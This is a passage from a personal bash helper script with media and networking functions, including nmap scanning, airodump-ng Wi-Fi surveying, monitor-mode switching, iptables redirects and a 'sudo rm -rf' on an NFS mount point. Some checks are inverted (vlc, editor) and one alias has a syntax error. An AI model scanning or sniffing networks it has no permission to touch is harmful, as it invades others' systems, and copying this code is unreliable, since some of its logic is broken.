            printf 'exiftool "%s" -P -DateTimeOriginal="%s" -overwrite_original\n' "${file_path}" "${modified_at_exif}" >> "${source}/picture-update-datetime_undo.sh"
        fi

        # update file date last modified
        _echo_info "touch \"${file_path}\" -d\"${datetime}\"\n"
        touch "${file_path}" -d"${datetime}"

        # print undo
        printf 'touch    "%s" -d"%s"\n' "${file_path}" "${modified_at}" >> "${source}/picture-update-datetime_undo.sh"
    done
}

## Play folder with vlc
function play() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'play [folder] -h (help)\n'
    }

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'play\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Play folder with vlc\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check vlc installation
    #--------------------------------------------------

    if [ -n "$(command -v vlc)" ]; then
        _echo_danger 'error: vlc required, enter: "sudo apt-get install -y vlc" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    local FOLDER
    FOLDER="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument
    #--------------------------------------------------

    if [ ! -d "${FOLDER}" ]; then
        _echo_danger 'error: source must be a folder\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    _echo_info "nohup vlc \"${FOLDER}\" &>/dev/null &\n"
    nohup vlc "${FOLDER}" &>/dev/null &
}

## Change multimedia file to correct extension
function rename-extension-to-codec() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'rename-extension-to-codec [folder] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local _basename
    local codec
    local count
    local current_directory
    local extension
    local file_path
    local new_path
    local source

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'rename-extension-to-codec\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Change multimedia file to correct extension\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check ffmpeg installation
    #--------------------------------------------------

    if [ -z "$(command -v 'ffmpeg')" ]; then
        _echo_danger 'error: ffmpeg not installed, try "sudo apt-get install -y ffmpeg"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    if [ ! -d "${source}" ]; then
        _echo_danger "error: \"${source}\" is not a valid directory\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    # find multimedia files
    find "${source}" -type f -iregex ".+\.\(aac\|aiff\|flac\|m4a\|mp3\|ogg\|wav\|wma\|avi\|flv\|m2ts\|mkv\|mov\|mp4\|mts\|webm\|wmv\)" | while read -r file_path; do

        codec="$(ffprobe -v quiet -show_streams -select_streams a "${file_path}" | grep '^codec_name=' | cut -d '=' -f2)"

        # check codec is valid
        if [ -z "${codec}" ]; then
            _echo_danger "error: cannot find valid codec for \"${file_path}\"\n"
            echo "cannot find valid codec for \"${file_path}\"" >> "${source}/error.log"
            continue
        fi

        # get extension including dot
        extension="$(echo "${file_path}" | grep -oE '\.[a-zA-Z0-9]+$')"

        # check correct file extension
        if [ ".${codec}" = "${extension}" ]; then
            _echo_warning "ignored : \"${file_path}\" - already correct extension\n"
            continue
        fi

        # get file base name without dot
        _basename="$(basename "${file_path}" "${extension}")"

        # get current directory excluding last forward slash
        current_directory="$(realpath "$(dirname "${file_path}")")"

        # generate new path
        new_path="${current_directory}/${_basename}.${codec}"

        # no overwrite: append and increment suffix when file exists
        count=0
        while [ -f "${new_path}" ]; do
            ((count+=1))
            new_path="${current_directory}/${_basename}_${count}.${codec}"
        done

        # -nostdin : avoid ffmpeg to swallow stdin
        _echo_info "mv \"${file_path}\" \"${new_path}\"\n"
        mv "${file_path}" "${new_path}"
    done
}

#--------------------------------------------------
# network aliases
#--------------------------------------------------

alias local-ip='_echo_info "hostname -I\n"; hostname -I' ## Print local ip
alias open-ports='_echo_info "lsof -i -Pn | grep LISTEN\n"; lsof -i -Pn | grep LISTEN' ## List open ports
alias test-tor='curl --socks5 localhost:9050 --socks5-hostname localhost:9050 -s https://check.torproject.org | grep -m 1 Congratulations' ## Check Tor configuration

alias close-ssh-tunnels='sudo pkill ssh'                ## Close all ssh tunnels
alias find-ssh-process='ps aux | grep ssh'              ## Find ssh processes
alias list-ssh='netstat -n --protocol inet | grep :22'  ## List open ssh connections
alias mac='ifconfig | grep HWaddr'                      ## Print mac address
alias resolve='_echo_info "host\n" &&; host'             ## Resolve reverse hostname
alias iptables-list-rules='_echo_info "sudo iptables -S"; sudo iptables -S; _echo_info "sudo iptables -L\n"; sudo iptables -L' ## list iptables rules
alias start-vnc='_echo_info "x11vnc -usepw -bg -forever\n"; x11vnc -usepw -bg -forever' ## Start VNC server in the background
alias stop-vnc='_echo_info "x11vnc -remote stop\n"; x11vnc -remote stop' ## Start VNC server in the background
alias start-ssh='sudo systemctl start ssh'              ## Start SSH server
alias stop-ssh='sudo systemctl stop ssh'                ## Stop SSH server

## Check DNS records
function check-dns() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'check-dns [domain] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local domain

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'check-dns\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Check DNS records\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check dig installation
    #--------------------------------------------------

    if [ -z "$(command -v 'dig')" ]; then
        _echo_danger 'error: dig not installed, try "sudo apt-get install -y dig"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    domain=${arguments[${LBOUND}]}

    #--------------------------------------------------

    _echo_info "dig \"${domain}\" +nostats +nocomments +nocmd\n"
    dig "${domain}" +nostats +nocomments +nocmd
}

## Get external IP
function external-ip() {
    #--------------------------------------------------
    # Check curl or wget installation
    #--------------------------------------------------

    if [ -z "$(command -v 'wget')" ] && [ -z "$(command -v 'curl')" ]; then
        _echo_danger 'error: curl not installed, try "sudo apt-get install -y curl"\n'
        return 1
    fi

    #--------------------------------------------------

    local ip

    #--------------------------------------------------

    ip="$(curl -s ipv4.icanhazip.com || wget -qO - ipv4.icanhazip.com)"
    if [ -z "${ip}" ]; then
        ip="$(curl -s api.ipify.org || wget -qO - api.ipify.org)\n"
    fi

    #--------------------------------------------------

    echo "${ip}"
}

## Edit hosts with default text editor
function hosts() {
    #--------------------------------------------------
    # Check default text editor installation
    #--------------------------------------------------

    if [ -x "$(command -v "${VISUAL}")" ]; then
        _echo_danger "error: ${VISUAL} not installed, try \"sudo apt-get install -y ${VISUAL}\"\n"
        return 1
    fi

    #--------------------------------------------------

    _echo_info "sudo \"${VISUAL}\" /etc/hosts\n"
    sudo "${VISUAL}" /etc/hosts
}

## List network adapters
function list-adapters() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'list-adapters -c (filter connected devices) -w (filter wifi devices) -v (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local adapters
    local command
    local filter_connected=false
    local filter_wifi=false
    local verbose=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :cwvh option; do
            case "${option}" in
                c) filter_connected=true;;
                w) filter_wifi=true;;
                v) verbose=true;;
                h) _echo_warning 'list-adapters\n';
                    _echo_success 'description:' 2 14; _echo_primary 'List network adapters\n'
                    _usage 2 14
                    _echo_success 'note:' 2 14; _echo_warning "available adapters: ${adapters}\n"
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 0 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ "${filter_connected}" = true ]; then
        # Check arp installation
        if [ -z "$(command -v 'arp')" ]; then
            _echo_danger 'error: arp not installed, try "sudo apt-get install -y net-tools"\n'
            return 1
        fi

        command="arp -a | cut -d' ' -f7 | uniq | sort"
        if [ "${filter_wifi}" = true ]; then
            # NOTE: `grep -o` output only the matching parts
            #     `^w\w*` match first word of each line starting with "w"
            command="${command} | grep -o '^w\w*'"
        fi

    elif [ "${filter_wifi}" = true ]; then
        # Check iwconfig installation
        if [ -z "$(command -v 'iwconfig')" ]; then
            _echo_danger 'error: iwconfig not installed, try "sudo apt-get install -y wireless-tools"\n'
            return 1
        fi

        # list all available wireless adapters
        # NOTE: `grep -o` output only the matching parts
        #     `^\w*` match first word of each line starting with a word character
        command="iwconfig 2>/dev/null | grep -o '^\w*' | sort"
    else

        if [ -x "$(command -v 'ip')" ]; then
            # list all available adapters
            command="ip token | cut -d' ' -f4 | sort"

        elif [ -z "$(command -v 'ifconfig')" ]; then
            _echo_danger 'error: ifconfig not installed, try "sudo apt-get install -y net-tools"\n'
            return 1
        fi

        # list all available adapters
        # NOTE: `-o` output only the matching parts
        #     `^\w*` match first word of each line starting with a word character
        command="ifconfig | grep -o '^\w*' | sort"
    fi

    command="${command} | tr '\n' ' ' | sed -E 's/ +$//'"

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ "${verbose}" = true ]; then
        _echo_info "${command}\n"
    fi

    eval "${command}"
}

## Mount nfs shared ressource into local mount point
function mount-nfs() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'mount-nfs [server]:[resource] -m [mount_point] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local mount_point
    local ressource

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :m:h option; do
            case "${option}" in
                m) mount_point="${OPTARG}";;
                h) _echo_warning 'mount-nfs\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Mount nfs shared ressource into local mount point\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # check nfs client installed
    #--------------------------------------------------

    if ! dpkg -la 2>/dev/null | grep -q nfs-common; then
        _echo_danger 'error: nsf-common required: enter "sudo apt-get install -y nfs-common" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    ressource="${arguments[${LBOUND}]}"

    #--------------------------------------------------

    # set default mount point
    if [ -z "${mount_point}" ]; then
        mount_point=/media/nfs
    fi

    # create mount point when not found
    if [ ! -d ${mount_point} ]; then
        _echo_info "sudo mkdir -p \"${mount_point}\"\n"
        sudo mkdir -p "${mount_point}"
    fi

    _echo_info "sudo mount \"${ressource}\" \"${mount_point}\"\n"
    sudo mount "${ressource}" "${mount_point}"

    _echo_info 'df -h\n'
    df -h
}

## Redirect ports with iptables
function port-redirect() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'port-redirect [source_port] [destination_port] -u (udp) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local source
    local destination
    local protocol='tcp'

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :uh option; do
            case "${option}" in
                u) protocol='udp';;
                h) _echo_warning 'port-redirect\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Redirect ports with iptables\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    if [ "${#arguments[@]}" -ne 2 ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Check iptables installation
    #--------------------------------------------------

    if [ ! -x "$(command -v iptables)" ]; then
        _echo_danger 'error: iptables required, enter: "sudo apt-get install -y iptables" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    source="${arguments[${LBOUND}]}"
    destination=${arguments[${LBOUND}+1]}

    #--------------------------------------------------

    # port should be a positive integer
    if [[ ! "${source}" =~ ^[0-9]+$ ]] || [[ ! "${destination}" =~ ^[0-9]+$ ]]; then
        _echo_danger 'error: port should be a positive integer\n'
        _usage 2 8
        return 1
    fi

    _echo_info "sudo iptables -A INPUT -p \"${protocol}\" --dport \"${source}\" -j ACCEPT\n"
    sudo iptables -A INPUT -p "${protocol}" --dport "${source}" -j ACCEPT

    _echo_info "sudo iptables -t nat -A PREROUTING -p \"${protocol}\" --dport \"${source}\" -j REDIRECT --to-port \"${destination}\"\n"
    sudo iptables -t nat -A PREROUTING -p "${protocol}" --dport "${source}" -j REDIRECT --to-port "${destination}"
}

## Scan with nmap
function scan() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'scan [range/ip] -q (quick) -p (ping) -P (port) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local local_ip
    local ping=false
    local port=false
    local quick=true
    local range

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :hpPq option; do
            case "${option}" in
                q) ping=false;port=false;quick=true;;
                p) ping=true;port=false;quick=false;;
                P) ping=false;port=true;quick=false;;
                h) _echo_warning 'scan\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Scan with nmap\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check nmap installation
    #--------------------------------------------------

    if [ ! -x "$(command -v nmap)" ]; then
        _echo_danger 'error: nmap required, enter: "sudo apt-get install -y nmap" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ "${quick}" = true ] || [ "${ping}" = true ]; then
        if [ -z "${arguments[${LBOUND}]}" ]; then
            # get local ip range
            if [ -z "$(hostname -I 2>/dev/null)" ]; then
                range=192.168.0.1/24
            else
                range="$(hostname -I | grep -oP '^\d{1,3}\.\d{1,3}\.\d{1,3}\.')1/24"
            fi
        else
            range="${arguments[${LBOUND}]}"
        fi
    fi

    if [ "${ping}" = true ]; then
        _echo_info "nmap -sn \"${range}\"\n"
        nmap -sn "${range}"
        return 0
    fi

    if [ "${quick}" = true ]; then
        _echo_info "nmap -sP \"${range}\"\n"
        nmap -sP "${range}"
        return 0
    fi

    if [ "${port}" = true ]; then
        if [ -z "${arguments[${LBOUND}]}" ]; then
            # get local ip
            if [ -z "$(hostname -I 2>/dev/null)" ]; then
                local_ip=192.168.0.1
            else
                local_ip="$(hostname -I | cut -d' ' -f1)"
            fi
        else
            local_ip="${arguments[${LBOUND}]}"
        fi

        _echo_info "nmap -sV -sC \"$local_ip\"\n"
        nmap -sV -sC "$local_ip"
    fi
}

## Create / delete hosts in /etc/hosts
function set_hosts() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'set-hosts [hosts] -i (ip) -d (delete) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local host_name
    local ip_address=127.0.0.1
    local delete=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :i:dh option; do
            case "${option}" in
                d) delete=true;;
                i) ip_address="${OPTARG}";;
                h) _echo_warning 'set_hosts\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Create / delete hosts in /etc/hosts\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    for host_name in "${arguments[@]}"; do

        # find "hostname"
        if < /etc/hosts grep -q -P "\s+${host_name}$";then
            # remove every occurence
            # shellcheck disable=SC2002
            cat /etc/hosts | grep -vP "\s+${host_name}$" | sudo tee /etc/hosts >/dev/null

            if [ "${delete}" = true ];then
                _echo_danger "Deleting host: \"${ip_address}    ${host_name}\"\n"
            else
                _echo_warning "Updating host: \"${ip_address}    ${host_name}\"\n"
                sudo /bin/sh -c "echo \"${ip_address}    ${host_name}\">> /etc/hosts"
            fi
        else
            if [ "${delete}" = true ];then
                _echo_danger "error: \"${host_name}\" not found\n"
            else
                _echo_success "Creating host: \"${ip_address}    ${host_name}\"\n"
                sudo /bin/sh -c "echo \"${ip_address}    ${host_name}\">> /etc/hosts"
            fi
        fi
    done
}

## Unmount nfs share
function unmount-nfs() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'unmount-nfs (mount_point) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local mount_point=/media/nfs

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :h option; do
        case "${option}" in
            h) _echo_warning 'unmount-nfs\n';
                _echo_success 'description:' 2 14; _echo_primary 'unmount nfs share\n'
                _usage 2 14
            return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
            return 1;;
        esac
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "$#" -gt 1 ]; then
        _echo_danger "error: too many arguments ($#)\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ -n "$1" ]; then
        mount_point=$1
    fi

    #--------------------------------------------------

    _echo_info "sudo umount -flv \"${mount_point}\"\n"
    sudo umount -flv "${mount_point}"

    _echo_info "sudo rm -rf \"${mount_point}\"\n"
    sudo rm -rf "${mount_point}"

    _echo_info 'df -h\n'
    df -h
}

## Print available bssids, channels and ssids
function wifi-get-bssids() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'wifi-get-bssids -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local temp_dir
    local wifi_adapter
    local wifi_adapters

    #--------------------------------------------------

    # showing wireless adapters only
    if [ -n "$(command -v 'arp')" ]; then
        # NOTE: arp command prints connected devices only
        # set wireless as default adapter
        wifi_adapter="$(arp -a | cut -d' ' -f7 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(arp -a | cut -d' ' -f7 | grep -E '^w')")"

    elif [ -n "$(command -v 'ip')" ]; then
        # set wireless as default adapter
        wifi_adapter="$(ip token | cut -d' ' -f4 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ip token | cut -d' ' -f4 | grep -E '^w')")"

    else
        # set wireless as default adapter
        wifi_adapter="$(ifconfig | grep -E '^w' | head -n1 | cut -d: -f1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ifconfig | grep -E '^w\w+:' | cut -d: -f1)")"
    fi

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :a:h option; do
            case "${option}" in
                a) wifi_adapter="${OPTARG}";;
                h) _echo_warning 'wifi-get-bssids\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Print available bssids, channels and ssids\n'
                    _usage 2 14
                    _echo_success 'note:' 2 14; _echo_warning "available adapters: ${wifi_adapters}\n"
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check ifconfig installation
    #--------------------------------------------------

    if [ -z "$(command -v 'ifconfig')" ]; then
        _echo_danger 'error: ifconfig not installed, try "sudo apt-get install -y net-tools"\n'
        return 1
    fi

    #--------------------------------------------------
    # Check airodump-ng installation
    #--------------------------------------------------

    if [ -z "$(command -v 'airodump-ng')" ]; then
        _echo_danger 'error: airodump-ng not installed, try "sudo apt-get install -y aircrack-ng"\n'
        return 1
    fi

    #--------------------------------------------------

    temp_dir="$(mktemp -d)"

    _echo_info "timeout 5s sudo airodump-ng --write \"${temp_dir}\"/temp --output-format csv --band abg \"${wifi_adapter}\" &>/dev/null\n"
    timeout 5s sudo airodump-ng --write "${temp_dir}"/temp --output-format csv --band abg "${wifi_adapter}" &>/dev/null

    _echo_info "cat \"${temp_dir}\"/temp-*.csv | sed -E 's/, +/,/g' | sed -E '/^ $/d' | tail -n +2 | head -n -1 | cut -d, -f1,4,14\n"
    cat "${temp_dir}"/temp-*.csv | sed -E 's/, +/,/g' | sed -E '/^ $/d' | tail -n +2 | head -n -1 | cut -d, -f1,4,14
}

## Set wlan adapter to managed mode
function wifi-managed-mode() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'wifi-managed-mode (adapter) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local wifi_adapter
    local wifi_adapters

    #--------------------------------------------------

    # showing wireless adapters only
    if [ -n "$(command -v 'arp')" ]; then
        # NOTE: arp command prints connected devices only
        # set wireless as default adapter
        wifi_adapter="$(arp -a | cut -d' ' -f7 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(arp -a | cut -d' ' -f7 | grep -E '^w')")"

    elif [ -n "$(command -v 'ip')" ]; then
        # set wireless as default adapter
        wifi_adapter="$(ip token | cut -d' ' -f4 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ip token | cut -d' ' -f4 | grep -E '^w')")"

    else
        # set wireless as default adapter
        wifi_adapter="$(ifconfig | grep -E '^w' | head -n1 | cut -d: -f1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ifconfig | grep -E '^w\w+:' | cut -d: -f1)")"
    fi

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'wifi-managed-mode\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Set wlan adapter to managed mode\n'
                    _usage 2 14
                    _echo_success 'note:' 2 14; _echo_primary "available wifi adapters: ${wifi_adapters}\n"
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check iwconfig installation
    #--------------------------------------------------

    if [ -z "$(command -v 'iwconfig')" ]; then
        _echo_danger 'error: iwconfig not installed, try "sudo apt-get install -y iwconfig"\n'
        return 1
    fi

    #--------------------------------------------------
    # Check ifconfig installation
    #--------------------------------------------------

    if [ -z "$(command -v 'ifconfig')" ]; then
        _echo_danger 'error: ifconfig not installed, try "sudo apt-get install -y net-tools"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ -n "${arguments[${LBOUND}]}" ]; then
        wifi_adapter="${arguments[${LBOUND}]}"
    fi

    #--------------------------------------------------

    _echo_info "sudo ifconfig \"${wifi_adapter}\" down\n"
    sudo ifconfig "${wifi_adapter}" down

    # optional check kill with airmon-ng if installed
    if [ -n "$(command -v 'airmon-ng')" ]; then
        _echo_info 'sudo airmon-ng check kill\n'
        sudo airmon-ng check kill
    fi

    _echo_info "sudo iwconfig \"${wifi_adapter}\" mode managed\n"
    sudo iwconfig "${wifi_adapter}" mode managed

    _echo_info "sudo ifconfig \"${wifi_adapter}\" up\n"
    sudo ifconfig "${wifi_adapter}" up

    _echo_info "sudo iwconfig \"${wifi_adapter}\"\n"
    sudo iwconfig "${wifi_adapter}"
}

## Set wlan adapter to monitor mode
function wifi-monitor-mode() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'wifi-monitor-mode (adapter) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local wifi_adapter
    local wifi_adapters

    #--------------------------------------------------

    # showing wireless adapters only
    if [ -n "$(command -v 'arp')" ]; then
        # NOTE: arp command prints connected devices only
        # set wireless as default adapter
        wifi_adapter="$(arp -a | cut -d' ' -f7 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(arp -a | cut -d' ' -f7 | grep -E '^w')")"

    elif [ -n "$(command -v 'ip')" ]; then
        # set wireless as default adapter
        wifi_adapter="$(ip token | cut -d' ' -f4 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ip token | cut -d' ' -f4 | grep -E '^w')")"

    else
        # set wireless as default adapter
        wifi_adapter="$(ifconfig | grep -E '^w' | head -n1 | cut -d: -f1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ifconfig | grep -E '^w\w+:' | cut -d: -f1)")"
    fi

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
